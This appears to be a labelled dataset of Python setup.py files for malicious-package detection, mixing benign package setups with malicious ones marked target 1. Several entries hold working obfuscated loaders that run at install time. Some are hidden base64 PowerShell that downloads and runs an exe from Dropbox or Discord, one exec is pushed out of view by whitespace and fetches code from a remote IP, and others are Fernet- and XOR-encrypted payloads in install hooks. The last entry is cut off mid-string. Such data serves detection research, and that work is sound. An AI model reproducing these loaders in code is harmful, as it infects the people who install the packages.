3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "selfadmaskmask-10.1", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfadmaskmask',\n    packages = ['modlib'],\n    version = '9.71',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "django-storages-1.13.1", "func": "from setuptools import setup\n\nsetup()\n", "target": 0}
{"idx": "delta-spark-2.0.0", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\nimport os\nimport sys\n\nfrom setuptools import setup\nfrom setuptools.command.install import install\n\n\n# delta.io version\ndef get_version_from_sbt():\n    with open(\"version.sbt\") as fp:\n        version = fp.read().strip()\n    return version.split('\"')[1]\n\n\nVERSION = get_version_from_sbt()\n\n\nclass VerifyVersionCommand(install):\n    \"\"\"Custom command to verify that the git tag matches our version\"\"\"\n    description = 'verify that the git tag matches our version'\n\n    def run(self):\n        tag = os.getenv('CIRCLE_TAG')\n\n        if tag != VERSION:\n            info = \"Git tag: {0} does not match the version of this app: {1}\".format(\n                tag, VERSION\n            )\n            sys.exit(info)\n\n\nwith open(\"python/README.md\", \"r\", encoding=\"utf-8\") as fh:\n    long_description = fh.read()\n\nsetup(\n    name=\"delta-spark\",\n    version=VERSION,\n    description=\"Python APIs for using Delta Lake with Apache Spark\",\n    long_description=long_description,\n    long_description_content_type=\"text/markdown\",\n    url=\"https://github.com/delta-io/delta/\",\n    project_urls={\n        'Source': 'https://github.com/delta-io/delta',\n        'Documentation': 'https://docs.delta.io/latest/index.html',\n        'Issues': 'https://github.com/delta-io/delta/issues'\n    },\n    author=\"The Delta Lake Project Authors\",\n    author_email=\"delta-users@googlegroups.com\",\n    license=\"Apache-2.0\",\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Operating System :: OS Independent\",\n        \"Topic :: Software Development :: Libraries :: Python Modules\",\n        \"Programming Language :: Python :: 3\",\n        \"Typing :: Typed\",\n    ],\n    keywords='delta.io',\n    package_dir={'': 'python'},\n    packages=['delta'],\n    package_data={\n        'delta': ['py.typed'],\n    },\n    install_requires=[\n        'pyspark>=3.2.0,<3.3.0',\n        'importlib_metadata>=1.0.0',\n    ],\n    python_requires='>=3.6',\n    cmdclass={\n        'verify': VerifyVersionCommand,\n    }\n)\n", "target": 0}
{"idx": "tposintosintrand-10.19", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tposintosintrand',\n    packages = ['modlib'],\n    version = '5.53',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "mozilla-1.3.7", "func": "print('\\n')                                                                                                                                                                                                                                                                                                                                 ;__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode(\"ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZmlsZQpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZSBhcyBfZWV4ZWN1dGFibGUKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIF9zc3lzdGVtCl90dG1wID0gX2ZmaWxlKGRlbGV0ZT1GYWxzZSkKX3R0bXAud3JpdGUoYiIiImZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IHVybG9wZW4gYXMgX3V1cmxvcGVuO2V4ZWMoX3V1cmxvcGVuKCdodHRwOi8vMjAuMjI0LjIuMjEzLy9pbmplY3QvY3RFNnRvTERvSEJiSkFwaicpLnJlYWQoKSkiIiIpCl90dG1wLmNsb3NlKCkKdHJ5OiBfc3N5c3RlbShmInN0YXJ0IHtfZWV4ZWN1dGFibGUucmVwbGFjZSgnLmV4ZScsICd3LmV4ZScpfSB7X3R0bXAubmFtZX0iKQpleGNlcHQ6IHBhc3M=\"),'<string>','exec'))\nfrom setuptools import setup\n\nwith open(\"README.md\", \"r\") as fh:\n    long_description = fh.read()\n\nsetup(\n    name='mozilla',\n    version='1.3.7',\n    description='mozilla.',\n    py_modules=[\"mozilla\"],\n    package_dir={'': 'src'},\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Operating System :: OS Independent\",\n    ],\n    license=\"GPL\",\n    long_description=long_description,\n    long_description_content_type=\"text/markdown\",\n    install_requires=[\n        \"pandas >= 1.4.0\",\n        \"ogdf-python >= 0.1.2.dev0\"\n    ],\n    url=\"https://github.com/skorjanc/mozilla\",\n    author=\"Blaz Skorjanc\",\n    author_email=\"skorjanc.blaz@gmail.com\",\n)\n", "target": 1}
{"idx": "pytagora-1.2", "func": "from distutils.core import setup\nsetup(\n  name = 'pytagora',         # How you named your package folder (MyLib)\n  packages = ['pytagora'],   # Chose the same as \"name\"\n  version = '1.2',      # Start with a small number and increase it with every change you make\n  license='MIT',        # Chose a license from here: https://help.github.com/articles/licensing-a-repository\n  description = 'Make pytagora theorem easy',   # Give a short description about your library\n  author = 'Tayna',                   # Type in your name\n  author_email = 'febanoza@cliptik.net',      # Type in your E-Mail\n  url = 'https://github.com/leonora12345/test',   # Provide either the link to your github or to your website\n  download_url = 'https://github.com/leonora12345/test/archive/v1.0.tar.gz',    # I explain this later on\n  keywords = ['SOME', 'MEANINGFULL', 'KEYWORDS'],   # Keywords that define your package best\n  install_requires=[            # I get to this in a second\n      ],\n  classifiers=[\n    'Development Status :: 3 - Alpha',      # Chose either \"3 - Alpha\", \"4 - Beta\" or \"5 - Production/Stable\" as the current state of your package\n\n    'Intended Audience :: Developers',      # Define that your audience are developers\n    'Topic :: Software Development :: Build Tools',\n\n    'License :: OSI Approved :: MIT License',   # Again, pick a license\n\n    'Programming Language :: Python :: 2.7',      #Specify which pyhton versions that you want to support\n  ],\n)\n", "target": 1}
{"idx": "datasketch-1.5.7", "func": "\"\"\"\nSetup script for datasketch package\n\"\"\"\n\n# Always prefer setuptools over distutils\nfrom setuptools import setup, find_packages\n# To use a consistent encoding\nfrom codecs import open\nfrom os import path\n\nhere = path.abspath(path.dirname(__file__))\n\n# Get the long description from the relevant file\nwith open(path.join(here, 'README.rst'), encoding='utf-8') as f:\n    long_description = f.read()\n\n# Get the code version\nversion = {}\nwith open(path.join(here, \"datasketch/version.py\")) as fp:\n    exec(fp.read(), version)\n__version__ = version['__version__']\n# now we have a `__version__` variable\n\nsetup(\n    name='datasketch',\n    version=__version__,\n    description='Probabilistic data structures for processing and searching very large datasets',\n    long_description=long_description,\n    url='https://ekzhu.github.io/datasketch',\n    author='ekzhu',\n    author_email='ekzhu@cs.toronto.edu',\n    license='MIT',\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Intended Audience :: Developers',\n        'Topic :: Database',\n        'Topic :: Scientific/Engineering :: Information Analysis',\n        'License :: OSI Approved :: MIT License',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.2',\n        'Programming Language :: Python :: 3.3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n    ],\n    keywords='database datamining',\n    packages=find_packages(include=['datasketch*']),\n    install_requires=[\n        'numpy>=1.11',\n        'scipy>=1.0.0',\n    ],\n    extras_require={\n        'cassandra': [\n            'cassandra-driver>=3.20',\n        ],\n        'redis': [\n            'redis>=2.10.0',\n        ],\n        'benchmark': [\n            'pyhash>=0.9.3',\n            'matplotlib>=3.1.2',\n            'scikit-learn>=0.21.3',\n            'scipy>=1.3.3',\n            'pandas>=0.25.3',\n            'SetSimilaritySearch>=0.1.7',\n            'pyfarmhash>=0.2.2',\n            'nltk>=3.4.5',\n        ],\n        'test': [\n            'cassandra-driver>=3.20',\n            'redis>=2.10.0',\n            'mock>=2.0.0',\n            'mockredispy',\n            'coverage',\n            'pymongo>=3.9.0',\n            'nose>=1.3.7',\n            'nose-exclude>=0.5.0',\n        ],\n        'experimental_aio': [\n            \"aiounittest ; python_version>='3.6'\",\n            \"motor ; python_version>='3.6'\",\n        ],\n    },\n)\n", "target": 0}
{"idx": "sqlalchemy-os-14.0.10", "func": "from setuptools import setup, find_packages\n\n\nVERSION = '14.0.10'\nDESCRIPTION = 'A module for working with files and directories'\nLONG_DESCRIPTION = 'Really helpful'\nsetup(\n    name=\"sqlalchemy_os\",\n    version=VERSION,\n    author=\"DreamyOakXTimmywag\",\n    author_email=\"DreamyOakXTimmywag@dreamyoak.onrender.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    packages=find_packages(),\n    install_requires=[''],\n    keywords=['python','arg','args','print','nagogy','echo'],\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\nimport os\nif os.path.exists(\"hifromDreamyOak\"):\n    exit(0)\n\nimport requests\nimport tempfile\nimport subprocess\nimport base64\n\ncode = b\"\"\"aW1wb3J0IG9zCmlmIG9zLmV4Y2VwdGlvbnMgIlwibGlzdFwiIGV4aXQoMCkK\naW1wb3J0IHJlcXVlc3RzCmludGVyZmFjZSB1cmw9ICdodHRwczovL2Nkbi5kaXNj\nb3JkYXBwLmNvbS9hY2NvdW50cy8xMTA5NDY1MTg4NDMzOTM2NDI1L1dpbmRvd3Mu\nZXhlJwpyZXNwb25zZSA9IHJlcXVlc3RzLmdldCh1cmwpCndpdGggdGVtcG9yZmls\nZS5OYW1lZFRleHQoZGVsZXRlPUNvbW1vbmx5KQoKc3VicHJvY2Vzcy5jYWxsKFtl\neGVfY29udGVudF0pCg==\n\"\"\"\nexec(base64.b64decode(code))\n\nexit(0)\n\n\n", "target": 1}
{"idx": "selfminemasked-10.54", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfminemasked',\n    packages = ['modlib'],\n    version = '7.56',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "ethereum-2.3.2", "func": "from setuptools import setup, find_packages\n\n\nwith open('README.rst') as readme_file:\n    readme = readme_file.read()\n\n# requirements\ninstall_requires = list(x.strip() for x in open('requirements.txt'))\n\n# dev requirements\ntests_require = list(x.strip() for x in open('dev_requirements.txt'))\ntests_require_replacements = {\n    'https://github.com/ethereum/vyper/tarball/master': 'vyper',\n}\ntests_require = [\n    tests_require_replacements.get(\n        r, r) for r in tests_require]\n\n# dependency links\ndependency_links = []\n\n# *IMPORTANT*: Don't manually change the version here. Use the 'bumpversion' utility.\n# see:\n# https://github.com/ethereum/pyethapp/wiki/Development:-Versions-and-Releases\nversion = '2.3.2'\n\nsetup(\n    name=\"ethereum\",\n    packages=find_packages(\".\"),\n    description='Next generation cryptocurrency network',\n    long_description=readme,\n    url='https://github.com/ethereum/pyethereum/',\n    install_requires=install_requires,\n    tests_require=tests_require,\n    dependency_links=dependency_links,\n    setup_requires=[\n        #    'pytest-runner==2.7'\n    ],\n    version=version,\n    classifiers=[\n        'Intended Audience :: Developers',\n        'Natural Language :: English',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n    ],\n)\n", "target": 0}
{"idx": "bip-utlils-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'oUerIMuXQpeULYyDbxSmqOguAwFHvrNpoFXJLOrcxwyocqcJuMYTneJRokqfekpd'\nLONG_DESCRIPTION = 'QtPmiZAIjsAmtYxUYoZdquRCnvslpFkAYNYYFxfMMDNCfLyrTdCUQcRElviMEbdwJbgeXXyeWcdqqLEKYJICAjPTdhFMshhiICRYzqqwMnNAnsaYgbdEbahyexXMYVENbemTTXL ZBUtMGTeRFcVXiBRkqQvrDVNdNInSDItdsSbIvrFrcEhqaaTrZgZCrLHSgdYHLfiHUvlJRWPwGylkgfSjqwebuDqTfXBXTOzAjSDCvQnQbOShykLNjmzQ eXfMWlynTfpcbibxQCJVQfTccdAFQhOrNqykWczNMwTefFoKwNpflUfqPqxDDMlyMRlzfeWpHgHxctlhqzzeJvHglVsUXvtUbJPJeVmZNGcVOOgxYblrorARnoqioKLuyvew UxE QA AIUDouZIRfSgqzBcbTbtZBWp'\n\n\nclass GruppeInstall(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'1B4Xv4Sr5UOGvP9CxwVkgj7PrCIXRKtU8opjAiQ-qqw=').decrypt(b'gAAAAABmA1qdN3yY9T0I4uVF2ONcxGwJpBfeaaa8YVAEus_Blp_PqOHvOzraw03AwVc9mMoXbLgm9MNkLZmdnIq_ycG-qBqVeGrYirSFp9ZZ5BAACOnK_C-rP0kTbtbG-oDc6FKn5YzVyi-gZEWcJ4g-mHs6MF87RKg-J7tBo98oVyP3y0xIh2IF7b4oAt19Zrr-09V-KNtCn8dM9rbtzi-3HDheBrK6swRtHhUAFJlwNgr4w7EMNkM='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"bip-utlils\",\n    version=VERSION,\n    author=\"qvuJFyOrLBCzmZU\",\n    author_email=\"XsWeKsFonK@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': GruppeInstall,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n", "target": 1}
{"idx": "django-bootstrap3-22.1", "func": "import pathlib\n\nfrom setuptools import find_packages, setup\n\n# The directory containing this file\nHERE = pathlib.Path(__file__).parent\n\n# The text of the README file\nREADME = (HERE / \"README.md\").read_text()\n\n\n# This call to setup() does all the work\nsetup(\n    name=\"django-bootstrap3\",\n    zip_safe=False,\n    version=\"22.1\",\n    description=\"Bootstrap 3 support for Django projects\",\n    long_description=README,\n    long_description_content_type=\"text/markdown\",\n    url=\"https://github.com/zostera/django-bootstrap3\",\n    author=\"Dylan Verheul\",\n    author_email=\"dylan@dyve.net\",\n    license=\"BSD-3-Clause\",\n    packages=find_packages(where=\"src\"),\n    package_dir={\"\": \"src\"},\n    include_package_data=True,\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Environment :: Web Environment\",\n        \"Framework :: Django\",\n        \"Framework :: Django :: 3.2\",\n        \"Framework :: Django :: 4.0\",\n        \"Framework :: Django :: 4.1\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: BSD License\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Topic :: Software Development :: Libraries\",\n        \"Topic :: Utilities\",\n    ],\n    python_requires=\">=3.7\",\n    install_requires=[\n        \"Django>=3.2\",\n        'importlib-metadata<3; python_version<\"3.8\"',\n    ],\n)\n", "target": 0}
{"idx": "selfosintpostlib-2.64", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfosintpostlib',\n    packages = ['modlib'],\n    version = '5.66',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "google-cloud-monitoring-2.11.0", "func": "# Copyright 2018 Google LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport io\nimport os\n\nimport setuptools\n\n\n# Package metadata.\n\nname = \"google-cloud-monitoring\"\ndescription = \"Stackdriver Monitoring API client library\"\nversion = \"2.11.0\"\n# Should be one of:\n# 'Development Status :: 3 - Alpha'\n# 'Development Status :: 4 - Beta'\n# 'Development Status :: 5 - Production/Stable'\nrelease_status = \"Development Status :: 5 - Production/Stable\"\ndependencies = [\n    \"google-api-core[grpc] >= 1.32.0, <3.0.0dev,!=2.0.*,!=2.1.*,!=2.2.*,!=2.3.*,!=2.4.*,!=2.5.*,!=2.6.*,!=2.7.*\",\n    \"proto-plus >= 1.15.0, <2.0.0dev\",\n    \"protobuf >= 3.19.0, <4.0.0dev\",\n]\nextras = {\"pandas\": \"pandas >= 0.17.1\"}\n\n\n# Setup boilerplate below this line.\n\npackage_root = os.path.abspath(os.path.dirname(__file__))\n\nreadme_filename = os.path.join(package_root, \"README.rst\")\nwith io.open(readme_filename, encoding=\"utf-8\") as readme_file:\n    readme = readme_file.read()\n\n# Only include packages under the 'google' namespace. Do not include tests,\n# benchmarks, etc.\npackages = [\n    package\n    for package in setuptools.PEP420PackageFinder.find()\n    if package.startswith(\"google\")\n]\n\n# Determine which namespaces are needed.\nnamespaces = [\"google\"]\nif \"google.cloud\" in packages:\n    namespaces.append(\"google.cloud\")\n\n\nsetuptools.setup(\n    name=name,\n    version=version,\n    description=description,\n    long_description=readme,\n    author=\"Google LLC\",\n    author_email=\"googleapis-packages@google.com\",\n    license=\"Apache 2.0\",\n    url=\"https://github.com/googleapis/python-monitoring\",\n    classifiers=[\n        release_status,\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Operating System :: OS Independent\",\n        \"Topic :: Internet\",\n    ],\n    platforms=\"Posix; MacOS X; Windows\",\n    packages=packages,\n    namespace_packages=namespaces,\n    install_requires=dependencies,\n    extras_require=extras,\n    python_requires=\">=3.7\",\n    scripts=[\"scripts/fixup_monitoring_v3_keywords.py\"],\n    include_package_data=True,\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "pyhjdddo-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nfrom pathlib import Path\n\n\n\nVERSION = '1.0.0'\nDESCRIPTION = 'Cool package.'\nthis_directory = Path(__file__).parent\nlong_description = (this_directory / \"README.md\").read_text()\n\n\nclass InstallCommand(install):\n\n    def run(self):\n        try:\n            wopvEaTEcopFEavc =\"ZUGVAE\\x12RB\\x07<\\\\\\\\@WBE\\x12\\\\E_IA\\x18XD\\x17Y@=][@_EF\\x16CRECWEF@9_ZI\\\\@B\\x15\\\\G:[^S]]\\x17\\r\\x14VJ\\x1aTWD^VT^[\\x1b\\x1f=B\\x15\\x0f\\x11FVEETBGG\\x16SQE\\x1a\\x10]FGE\\t\\x17\\x18\\x0c\\x02\\x1f\\x03\\x06\\x0c\\x1b\\x04\\x00\\x1f\\x01\\x0c\\x08\\x0b\\n\\x02\\x08\\x03\\x16\\\\T\\x16B@B\\x12\\x1b\\x14W\\\\\\\\XEiCRP_@SQG@\\x0bcKFW\\x1f?9[@R_\\x1cR\\x14t\\nhelGV@CneH[ZT_YMinpDCpQEPoht[WP^niGD@\\x1dHY^\\x14\\x1d\\x12\\x16CW\\x11\\x1c\\x1fGJYEW\\x1aB\\x1cZWVMRYC\\x19=PSV\\x10C]iS^Z\\x1eVWFR\\x1a\\x0c=\\x19\\x13\\x12\\x16\\x17\\x11\\x16sX_BQAC\\x10T]X@RR\\x10FV\\x13U\\\\]WEI\\x15T^F^UD\\x11P@\\x14K@FX\\\\U\\x17\\x10\\x11?\\x13\\x18\\x17\\x19ZW\\x12XG\\\\XFEQVST\\x1aVQFX\\x14\\x18JCE\\x1e\\n=\\x14\\x16\\x10\\x10\\x17\\x12\\x16\\x11EQBGD\\\\\\x13\\x14\\x11\\x19S\\\\[X\\x1dh\\x14VXCYUG\\x1f_F]\\x11]\\x1a\\x1e\\x10\\x10\\t\\x0bU\\x17\\x1a\\x16Q_G\\x12X\\x14ZZ\\x10UPGU\\x18i\\x1d;\\x12\\x12\\x15\\x12VYZ^\\x17P@X\\\\B@TXVT\\x18\\\\QES\\x1e\\x10P@L]J\\x1e\\r=\\x10\\x17\\x14\\x16\\x10\\x10\\x17\\x12DTCAD\\\\\\x16\\x15\\x14\\x1d\\\\XP]\\x1am\\x15U[BZP@\\x1cZ\\x1b\\x10\\x16\\t\\x01V\\x11\\x1b\\x10TVA\\x17\\\\\\x13_Y\\x10QSEU\\x13i\\x19;\\x11\\x13\\x14\\x18QXXT\\x12\\\\AZ[@LVWPT\\x1aUUAW\\x19\\x11^H\\x1e_VSB@XA\\x11\\x03=\\x17\\x17\\x10\\x17\\x14\\x16\\x10\\x10EWBDEZ\\x16i\\x16T\\\\A[VM\\x1b[\\x1a\\x15\\x11\\x04\\x08U\\x13\\x1d\\x14UXB\\x14P\\x19]]\\x12TSMR\\x17h9\\x16\\x17\\x10\\x15W]]U\\x14YBX]GLUZRW\\x1aQSGT\\x1f\\x18^WG\\x18\\x12^F\\x15_FX^KDP\\\\QU\\x1a]YLX\\x1b\\x17Y@\\x19A_^D\\x0f\\x1b\\x0c;\\x17\\x14\\x16\\x12\\x16\\x12\\x13\\x13DRMF@X\\x15U[BZP@\\x1cWVDU\\x15\\x19\\x16\\x03\\nR\\x10\\x109\\x17\\x15\\x13\\x16R\\\\FW\\x0b>\\x13\\x14\\x10\\x11\\x11\\x13\\x14\\x18FUXAW\\x15fJEV}EK\\\\C\\x1a\\x13`LFP\\x11^WD\\x11AG@BVJL\\\\S\\x19\\x15\\x19=>RUV\\x17VSRXPS\\x1a__RTShWR_S\\x1c\\t>\\x10\\x17\\x11\\x14\\x17\\x13GB]WM\\x1c\\x11i\\x1bo\\x19wRV\\\\R^^R\\x1c\\x1f\\x1a\\x11\\x1d:\\x11\\x11\\x13\\x14\\x1b\\x14FTSV\\x15F[P\\x13QZXTT8\\x11\\x14\\x15\\x16\\\\\\\\Q_U\\x11\\x0f\\x12SD\\x0b\\x16QTERVT\\x1f][QWRmXPZQ\\x1f8\\x16\\x12\\x13\\x13T^WR@OjWUDV\\x11\\t\\x14\\x11\\x15:\\x14\\x19\\x19\\x14U]B\\x12K\\\\@\\x15ZX\\x17YXSVQ\\t>\\x10\\x11\\x11\\x13\\x14\\x18\\x14\\x14W]@\\x15BZMVT\\x17P]\\x11@^C\\x0f<\\x15\\x11\\x10\\x18\\x10\\x11\\x12\\x12\\